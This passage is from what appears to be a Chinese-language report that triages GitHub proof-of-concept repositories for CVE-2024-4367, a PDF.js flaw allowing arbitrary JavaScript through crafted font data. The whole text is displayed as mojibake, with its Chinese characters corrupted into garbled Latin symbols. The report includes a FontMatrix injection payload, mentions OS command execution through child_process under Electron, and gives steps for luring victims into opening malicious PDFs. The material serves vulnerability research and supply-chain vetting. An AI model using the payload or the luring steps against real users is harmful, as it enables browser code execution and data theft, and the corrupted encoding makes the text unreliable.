**æœ‰æ•ˆæ€§ï¼š** æä¾›çš„POCä»£ç ï¼ˆ`ex1.pdf` å’Œ `ex-gist.pdf`ï¼‰é€šè¿‡æ„é€ æ¶æ„çš„`fontMatrix`æ•°æ®ï¼Œè¯æ˜äº†è¯¥æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚`ex1.pdf`è§¦å‘alertï¼Œ`ex-gist.pdf`ç”šè‡³å¯ä»¥ä»è¿œç¨‹åœ°å€åŠ è½½å¹¶æ‰§è¡ŒJavaScriptï¼ŒéªŒè¯äº†æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š** è™½ç„¶è¯¥é¡¹ç›®æä¾›äº†æ¼æ´åˆ©ç”¨çš„PoCï¼Œä½†æ˜¯æ£€æŸ¥äº†ä»“åº“ä¸­çš„å…¶ä»–æ–‡ä»¶ï¼Œå¦‚`astro.config.mjs`å’Œ`package-lock.json`ç­‰é…ç½®æ–‡ä»¶ï¼Œå¹¶æœªå‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç ã€‚ é£é™©ä¸»è¦å­˜åœ¨äºå¦‚æœä¸‹è½½è¯¥é¡¹ç›®å¹¶åœ¨å—ä¿¡ä»»çš„ç¯å¢ƒä¸­è¿è¡Œï¼Œè¿œç¨‹åŠ è½½çš„jsæ–‡ä»¶åŒ…å«æ¶æ„payloadçš„å¯èƒ½æ€§ï¼Œå› æ­¤æ¨æµ‹æŠ•æ¯’é£é™©è¾ƒä½ï¼Œé¢„ä¼°ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„å­—ä½“çš„PDFæ–‡ä»¶ï¼Œè¯¥å­—ä½“ä¸­åŒ…å«æ¶æ„çš„`fontMatrix`æ•°ç»„ã€‚
2.  `fontMatrix`æ•°ç»„çš„å…ƒç´ åŒ…å«JavaScriptä»£ç ã€‚
3.  å½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„PDF.jsç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.jsä¼šè§£æå­—ä½“æ•°æ®ï¼Œç”±äºç¼ºå°‘é€‚å½“çš„ç±»å‹æ£€æŸ¥ï¼Œä¼šå°†`fontMatrix`ä¸­çš„å­—ç¬¦ä¸²ä½œä¸ºJavaScriptä»£ç æ‰§è¡Œã€‚
4.  æ¶æ„JavaScriptä»£ç åœ¨å—å®³è€…çš„æµè§ˆå™¨æˆ–Electronåº”ç”¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´XSSæˆ–RCEã€‚

**é¡¹ç›®åœ°å€:** [Bhavyakcwestern/Hacking-pdf.js-vulnerability](https://github.com/Bhavyakcwestern/Hacking-pdf.js-vulnerability)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #5

**æ¥æº**: [CVE-2024-4367-LOURC0D3_CVE-2024-4367-PoC.md](../2024/CVE-2024-4367-LOURC0D3_CVE-2024-4367-PoC.md)

## CVE-2024-4367 - PDF.js ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼Œè¿œç¨‹ä»£ç æ‰§è¡Œç­‰ã€‚

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶ã€‚PDF.js å¿…é¡»é…ç½®ä¸º isEvalSupported=true (é»˜è®¤)

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº PDF.js ä¸­çš„æ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œå½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œå³å¯è§¦å‘æ¼æ´ã€‚ 

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚`CVE-2024-4367.py` è„šæœ¬ç”¨äºç”ŸæˆåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ PDF æ–‡ä»¶ã€‚ README.md æä¾›äº†ä½¿ç”¨ç¤ºä¾‹ï¼ŒåŒ…æ‹¬æ‰§è¡Œ `alert(document.domain)` ä»¥è¯æ˜ JavaScript ä»£ç æ‰§è¡Œï¼Œä»¥åŠåˆ©ç”¨ `require('child_process').exec()` æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ï¼ˆä»…åœ¨ Electron ç¯å¢ƒä¸‹ï¼‰ã€‚

**æŠ•æ¯’é£é™©ï¼š**
PoC ä»£ç æœ¬èº«æ˜¯ä¸ºäº†åˆ©ç”¨æ¼æ´ï¼Œè€Œä¸æ˜¯æ¤å…¥åé—¨ï¼Œå…¶ç›®çš„æ˜¯ç”ŸæˆåŒ…å«æ¶æ„ JavaScript çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶æ—¨åœ¨åˆ©ç”¨ç›®æ ‡åº”ç”¨ç¨‹åºï¼ˆFirefox, Thunderbirdï¼‰ä¸­çš„æ¼æ´ã€‚ è¯¥ä»“åº“ä¸­æŠ•æ¯’çš„é£é™©è¾ƒä½ï¼Œå¤§çº¦ä¸º 5%ã€‚ ä¸»è¦çš„æ½œåœ¨é£é™©å¯èƒ½æ¥è‡ªï¼š

1.  **ä¾èµ–é¡¹æŠ•æ¯’:** è„šæœ¬æœ¬èº«å¾ˆç®€å•ï¼Œä¸ä¾èµ–äºå¤–éƒ¨åº“ã€‚å› æ­¤ï¼Œä¾èµ–é¡¹æŠ•æ¯’çš„é£é™©å¾ˆä½ã€‚
2.  **ä»£ç é€»è¾‘æ··æ·†:**  ä»£ç ç›¸å¯¹æ¸…æ™°ï¼Œæ²¡æœ‰æ˜æ˜¾çš„æ¶æ„é€»è¾‘æˆ–æ··æ·†ã€‚
3.  **ä¾›åº”é“¾æ”»å‡»:** ç”±äºè¯¥ PoC æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è„šæœ¬ï¼Œå¹¶æ²¡æœ‰å¤æ‚çš„æ„å»ºæˆ–åˆ†å‘è¿‡ç¨‹ï¼Œä¾›åº”é“¾æ”»å‡»çš„é£é™©ä¹Ÿè¾ƒä½ã€‚

ç„¶è€Œï¼Œåœ¨ä½¿ç”¨ä»»ä½•ç¬¬ä¸‰æ–¹æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç æ—¶ï¼Œéƒ½åº”ä¿æŒè°¨æ…ï¼Œä»”ç»†å®¡æŸ¥ä»£ç ï¼Œå¹¶åœ¨éš”ç¦»ç¯å¢ƒä¸­æµ‹è¯•ï¼Œä»¥é¿å…æ½œåœ¨çš„é£é™©ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ¼æ´ç‚¹ï¼š** PDF.js åœ¨å¤„ç†å­—ä½“æ—¶çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±ã€‚
2.  **æ”»å‡»å‘é‡ï¼š** æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åˆ©ç”¨å­—ä½“å¤„ç†ä¸­çš„æ¼æ´åµŒå…¥æ¶æ„ JavaScript ä»£ç ã€‚
3.  **åˆ©ç”¨æ­¥éª¤ï¼š**
    *   ä½¿ç”¨ `CVE-2024-4367.py` è„šæœ¬ç”Ÿæˆæ¶æ„çš„ `poc.pdf` æ–‡ä»¶ï¼ŒæŒ‡å®šè¦æ‰§è¡Œçš„ JavaScript ä»£ç ä½œä¸ºå‚æ•°ã€‚
    *   è¯±å¯¼å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„ Firefox, Firefox ESR æˆ– Thunderbird æ‰“å¼€è¯¥ `poc.pdf` æ–‡ä»¶ã€‚
    *   å¦‚æœ PDF.js é…ç½®å…è®¸æ‰§è¡Œ JavaScript ä»£ç ï¼ˆé»˜è®¤æƒ…å†µä¸‹ `isEvalSupported` ä¸º trueï¼‰ï¼Œåˆ™åµŒå…¥åœ¨ PDF ä¸­çš„ JavaScript ä»£ç å°†åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
4.  **æ½œåœ¨å½±å“ï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯èƒ½å…è®¸æ”»å‡»è€…æ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼Œä»è€Œå¯¼è‡´:
    *   åœ¨æµè§ˆå™¨ä¸Šä¸‹æ–‡ä¸­çªƒå–æ•æ„Ÿä¿¡æ¯ï¼ˆä¾‹å¦‚ï¼Œcookiesï¼Œä¼šè¯ä»¤ç‰Œï¼‰ã€‚
    *   è¿›è¡Œè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€‚
    *   å¦‚æœ PDF.js è¿è¡Œåœ¨ Electron ç­‰ç¯å¢ƒä¸­ï¼Œå¯èƒ½æ‰§è¡Œä»»æ„æ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚

**é¡¹ç›®åœ°å€:** [LOURC0D3/CVE-2024-4367-PoC](https://github.com/LOURC0D3/CVE-2024-4367-PoC)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #6

**æ¥æº**: [CVE-2024-4367-Masamuneee_CVE-2024-4367-Analysis.md](../2024/CVE-2024-4367-Masamuneee_CVE-2024-4367-Analysis.md)

## CVE-2024-4367: PDF.js ä»»æ„JavaScriptæ‰§è¡Œæ¼æ´

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´XSSæ”»å‡»ï¼Œçªƒå–ç”¨æˆ·æ•°æ®ï¼Œç”šè‡³è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºç¼ºå°‘å¯¹å­—ä½“å¤„ç†çš„ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxã€Firefox ESRæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼ŒåµŒå…¥çš„JavaScriptä»£ç ä¼šè¢«æ‰§è¡Œã€‚  

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**  æä¾›çš„POCä»£ç çœ‹èµ·æ¥æ˜¯æœ‰æ•ˆçš„ã€‚`README.md` æ–‡ä»¶æä¾›äº†æ¼æ´çš„æ¦‚è¿°ã€åˆ©ç”¨æ–¹æ³•ã€ç¼“è§£æªæ–½å’Œè¯¦ç»†åˆ†æçš„é“¾æ¥ã€‚`poc.py` è„šæœ¬ç”¨äºç”ŸæˆåŒ…å«æ¶æ„payloadçš„PDFæ–‡ä»¶ã€‚`app` ç›®å½•åŒ…å«ä¸€ä¸ªç®€å•çš„Node.jsåº”ç”¨ï¼Œç”¨äºæœ¬åœ°æµ‹è¯•ï¼Œå…è®¸ä¸Šä¼ PDFæ–‡ä»¶å¹¶é€šè¿‡`pdfjs-dist`åº“è¿›è¡Œæ¸²æŸ“ã€‚  `public/index.html` åŒ…å«å‰ç«¯ä»£ç ï¼Œç”¨äºä¸Šä¼ PDFå¹¶ä½¿ç”¨`pdf.js`è¿›è¡Œæ¸²æŸ“ã€‚  

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**  
*   æŸ¥çœ‹ `poc.pdf` ç¡®è®¤æ˜¯å¦æ¤å…¥åé—¨ï¼Œ`poc.pdf` æ˜¯æ¶æ„çš„PDFï¼Œ åˆ©ç”¨äº†å­—ä½“çš„è§£ææ¼æ´ï¼Œæ‰§è¡ŒJavascriptä»£ç ã€‚ ä½†æ˜¯ä¸å±äºåé—¨ï¼Œåªå±äºpocéªŒè¯çš„ä¸€éƒ¨åˆ†
*   æŸ¥çœ‹ `server.js` ä¸­é—´ä»¶æ˜¯å¦åŒ…å«æ¶æ„ä»£ç ï¼Œ`server.js` ä¸­é—´ä»¶å±äºæ­£å¸¸çš„expressä¸Šä¼ pdfå’Œæ‰“å¼€pdfçš„é€»è¾‘ã€‚
*   æŸ¥çœ‹ `public/index.html` ç¡®è®¤æ˜¯å¦è°ƒç”¨æ¶æ„apiï¼Œ `public/index.html`å±äºå‰ç«¯ä»£ç ï¼Œç”¨äºä¸Šä¼ pdfï¼Œå¹¶æ¸²æŸ“pdfï¼Œæ²¡æœ‰æ¶æ„apiè°ƒç”¨ã€‚
*   æŸ¥çœ‹ `poc.py` ç¡®è®¤æ˜¯å¦ç”Ÿæˆäº†æ¶æ„PDFï¼Œ`poc.py`å±äºpocéªŒè¯çš„ä¸€éƒ¨åˆ†
æ€»ä½“åˆ¤æ–­æŠ•æ¯’é£é™©æä½ï¼Œå¯èƒ½å­˜åœ¨çš„é£é™©æ˜¯ä¾èµ–åŒ…çš„ä¾›åº”é“¾æŠ•æ¯’é£é™©,è€ƒè™‘åˆ°node_modulesä½“ç§¯å·¨å¤§ï¼Œäººå·¥å®¡è®¡æˆæœ¬å¤ªé«˜ï¼Œæ‰€ä»¥è®¤ä¸ºå­˜åœ¨ 1% çš„æ½œåœ¨æŠ•æ¯’é£é™©ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**
1.  æ”»å‡»è€…ä½¿ç”¨ `poc.py` è„šæœ¬ç”ŸæˆåŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…é€šè¿‡å„ç§æ‰‹æ®µï¼ˆä¾‹å¦‚ï¼Œç”µå­é‚®ä»¶ã€ç½‘ç«™é“¾æ¥ï¼‰è¯±ä½¿ç”¨æˆ·æ‰“å¼€è¯¥PDFæ–‡ä»¶ã€‚
3.  å¦‚æœç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxã€Firefox ESRæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶ï¼ŒPDF.jsä¼šè§£æè¯¥æ–‡ä»¶ã€‚
4.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„çš„JavaScriptä»£ç ä¼šåœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œä»è€Œå®ç°XSSæ”»å‡»æˆ–æ½œåœ¨çš„è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
5.  æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ‰§è¡Œçš„JavaScriptä»£ç çªƒå–ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯ã€ä¿®æ”¹ç½‘é¡µå†…å®¹ï¼Œç”šè‡³æ§åˆ¶ç”¨æˆ·çš„è®¡ç®—æœºã€‚

**é¡¹ç›®åœ°å€:** [Masamuneee/CVE-2024-4367-Analysis](https://github.com/Masamuneee/CVE-2024-4367-Analysis)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #7

**æ¥æº**: [CVE-2024-4367-MihranGIT_POC_CVE-2024-4367.md](../2024/CVE-2024-4367-MihranGIT_POC_CVE-2024-4367.md)

## CVE-2024-4367 - Firefox/Thunderbird PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird

**å±å®³ç­‰çº§:** ä¸­å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»(XSS)å’Œæ•æ„Ÿä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶ï¼Œå¹¶ä¸”PDF.jsé…ç½®ä¸­`isEvalSupported`è®¾ç½®ä¸º`true` (é»˜è®¤å€¼)

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla Firefoxã€Firefox ESR å’Œ Thunderbird ä¸­ PDF.js ç»„ä»¶çš„ä¸€ä¸ªæ¼æ´ï¼Œå®ƒå…è®¸æ”»å‡»è€…åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚è¯¥æ¼æ´æ˜¯ç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥å¯¼è‡´çš„ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„ POC ä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒåŒ…å«ä¸€ä¸ªç‰¹åˆ¶çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å®šä¹‰äº†ä¸€ä¸ªè‡ªå®šä¹‰å­—ä½“ï¼ˆå¯¹è±¡ 5 0 objï¼‰ï¼Œè¯¥å­—ä½“çš„ `FontMatrix` å±æ€§åŒ…å« JavaScript ä»£ç ï¼š`/FontMatrix [0.1 0 0 0.1 0 (1\); alert\('document.location'\)]`ã€‚å½“å‘ˆç°æ­¤ PDF æ–‡ä»¶æ—¶ï¼Œå¦‚æœ PDF.js æ²¡æœ‰æ­£ç¡®æ‰§è¡Œç±»å‹æ£€æŸ¥ï¼Œå°±ä¼šæ‰§è¡Œ `alert('document.location')`ã€‚

**æŠ•æ¯’é£é™©ï¼š**

ç»è¿‡åˆ†æï¼Œæä¾›çš„POCä»£ç ä¸­**æ²¡æœ‰**å‘ç°æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚`alert('document.location')` ä»…ä»…æ˜¯ä¸€ä¸ªå¼¹çª—ï¼Œç”¨äºéªŒè¯XSSæ˜¯å¦æ‰§è¡Œ. 

æŠ•æ¯’é£é™©è¯„ä¼°ï¼š0%

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **åˆ›å»ºæ¶æ„ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…ä¼šåˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ç‰¹åˆ¶ PDF æ–‡ä»¶ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒJavaScript ä»£ç åµŒå…¥åœ¨å­—ä½“å¯¹è±¡çš„ `FontMatrix` å±æ€§ä¸­ã€‚
2.  **è¯±å¯¼ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…éœ€è¦è¯±å¯¼ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“ç‰ˆæœ¬çš„ Firefoxã€Firefox ESR æˆ– Thunderbird æ‰“å¼€è¿™ä¸ªæ¶æ„ PDF æ–‡ä»¶ã€‚è¿™å¯ä»¥é€šè¿‡ç½‘ç»œé’“é±¼æ”»å‡»ã€æ¶æ„ç½‘ç«™æˆ–å°† PDF æ–‡ä»¶åµŒå…¥åˆ°ç”µå­é‚®ä»¶ä¸­æ¥å®ç°ã€‚
3.  **JavaScript ä»£ç æ‰§è¡Œï¼š** å½“ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶æ—¶ï¼ŒPDF.js ä¼šå°è¯•è§£æå’Œå‘ˆç° PDF å†…å®¹ã€‚ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå­—ä½“å¯¹è±¡çš„ `FontMatrix` å±æ€§ä¸­çš„ JavaScript ä»£ç å°†è¢«æ‰§è¡Œã€‚å¦‚æœæˆåŠŸ `alert('document.location')` ä¼šè§¦å‘ã€‚
4.  **æ½œåœ¨å½±å“ï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯èƒ½å¯¼è‡´ä»¥ä¸‹åæœï¼š
    *   **è·¨ç«™è„šæœ¬æ”»å‡» (XSS)ï¼š** æ”»å‡»è€…å¯ä»¥åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œæ¶æ„ JavaScript ä»£ç ï¼Œä»è€Œçªƒå–æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚ Cookieã€ä¼šè¯ä»¤ç‰Œï¼‰ã€ç¯¡æ”¹ç½‘é¡µå†…å®¹æˆ–é‡å®šå‘ç”¨æˆ·åˆ°æ¶æ„ç½‘ç«™ã€‚
    *   **ä¿¡æ¯æ³„éœ²ï¼š** æ”»å‡»è€…å¯ä»¥è®¿é—®ç”¨æˆ·çš„æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿæˆ–ç½‘ç»œèµ„æºï¼Œä»è€Œæ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚

**ç¼“è§£æªæ–½ï¼š**

*   **å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬ï¼š** å°† Firefoxã€Firefox ESR å’Œ Thunderbird å‡çº§åˆ°å·²ä¿®å¤æ­¤æ¼æ´çš„ç‰ˆæœ¬ (>= Firefox 126, >= Firefox ESR 115.11, >= Thunderbird 115.11)ã€‚
*   **è°¨æ…æ‰“å¼€ PDF æ–‡ä»¶ï¼š** é¿å…æ‰“å¼€æ¥è‡ªä¸å¯ä¿¡æ¥æºçš„ PDF æ–‡ä»¶ã€‚
*   **é…ç½® PDF.jsï¼š** å¦‚æœä¸éœ€è¦ JavaScript æ”¯æŒï¼Œå¯ä»¥ç¦ç”¨ PDF.js çš„ JavaScript æ‰§è¡ŒåŠŸèƒ½ (å°† `isEvalSupported` è®¾ç½®ä¸º `false`)ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼ç›¸å¯¹ç®€å•ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„ PDF æ–‡ä»¶å¹¶è¯±å¯¼ç”¨æˆ·æ‰“å¼€æ¥æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚è™½ç„¶CVSSè¯„åˆ†ä¸é«˜ï¼Œä½†ç”±äºfirefox,thunderbirdç”¨æˆ·çš„å¹¿æ³›æ€§ï¼Œå…¶é€ æˆçš„å±å®³ä¸å¯å¿½è§†

**é¡¹ç›®åœ°å€:** [MihranGIT/POC_CVE-2024-4367](https://github.com/MihranGIT/POC_CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #8

**æ¥æº**: [CVE-2024-4367-PenguinCabinet_CVE-2024-4367-hands-on.md](../2024/CVE-2024-4367-PenguinCabinet_CVE-2024-4367-hands-on.md)

## CVE-2024-4367-Firefox-PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»(XSS)å’Œä¿¡æ¯æ³„éœ²ã€‚

**å½±å“ç‰ˆæœ¬:** < Firefox 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367æ˜¯Mozilla Firefoxã€Firefox ESRå’ŒThunderbirdä¸­PDF.jsç»„ä»¶çš„ä¸€ä¸ªæ¼æ´ã€‚è¯¥æ¼æ´æºäºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ¶ä½œä¸€ä¸ªç‰¹åˆ¶çš„PDFæ–‡ä»¶ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxç‰ˆæœ¬æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œæ¶æ„JavaScriptä»£ç å°†è¢«æ‰§è¡Œã€‚ 

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„POCä»£ç çœ‹èµ·æ¥æ˜¯æœ‰æ•ˆçš„ã€‚`README.md` æ–‡ä»¶ä¸­æä¾›äº†åˆ©ç”¨æ­¥éª¤ï¼š
1.  ä½¿ç”¨ `CVE-2024-4367.py` è„šæœ¬ç”ŸæˆåŒ…å«æ¶æ„JavaScriptä»£ç çš„ `poc.pdf` æ–‡ä»¶ã€‚
2.  ä½¿ç”¨ `firefox.py` è„šæœ¬å¯åŠ¨æ˜“å—æ”»å‡»ç‰ˆæœ¬çš„Firefox (ä¾‹å¦‚ 125ç‰ˆ)ï¼Œå¹¶è‡ªåŠ¨æ‰“å¼€ `poc.pdf`ã€‚
3.  éªŒè¯æ˜¯å¦æ‰§è¡Œäº†JavaScriptä»£ç ï¼Œæ˜¯å¦å¼¹å‡ºäº†alertçª—å£ã€‚

`firefox.py` è„šæœ¬å¯ä»¥ä¸‹è½½å¹¶å¯åŠ¨æŒ‡å®šç‰ˆæœ¬çš„Firefox Nightlyç‰ˆæœ¬ï¼Œè¿™æ–¹ä¾¿äº†æ¼æ´çš„éªŒè¯ã€‚è„šæœ¬è¿˜åŒ…å«äº†ä¸‹è½½ç‰¹å®šç‰ˆæœ¬Firefoxçš„é“¾æ¥ã€‚

**æŠ•æ¯’é£é™©ï¼š**

å¯¹æä¾›çš„POCä»£ç è¿›è¡Œäº†åˆ†æï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º5%ã€‚é£é™©ä¸»è¦æ¥è‡ªäºä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1.  **`firefox.py`è„šæœ¬:**
    *   è¯¥è„šæœ¬ä¼šä»Mozillaçš„å®˜æ–¹FTPæœåŠ¡å™¨ä¸‹è½½Firefox Nightlyç‰ˆæœ¬ã€‚è™½ç„¶è¿™æ˜¯å®˜æ–¹æ¥æºï¼Œä½†æ”»å‡»è€…å¯èƒ½åœ¨æœªæ¥ç¯¡æ”¹è¿™äº›FTPæœåŠ¡å™¨ï¼ˆè™½ç„¶å¯èƒ½æ€§æä½ï¼‰ã€‚æˆ–è€…ï¼Œåœ¨ä¸‹è½½è¿‡ç¨‹ä¸­å‘ç”Ÿä¸­é—´äººæ”»å‡»ï¼Œä»è€Œä¸‹è½½è¢«ç¯¡æ”¹çš„Firefoxç‰ˆæœ¬ã€‚
    *   è¯¥è„šæœ¬åŒ…å« `subprocess.run` å‡½æ•°ï¼Œç”¨äºæ‰§è¡Œä¸‹è½½çš„Firefoxã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶è„šæœ¬æ‰§è¡Œçš„å‚æ•°ï¼Œå¯èƒ½ä¼šæ³¨å…¥é¢å¤–çš„å‚æ•°ï¼Œå¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç ã€‚
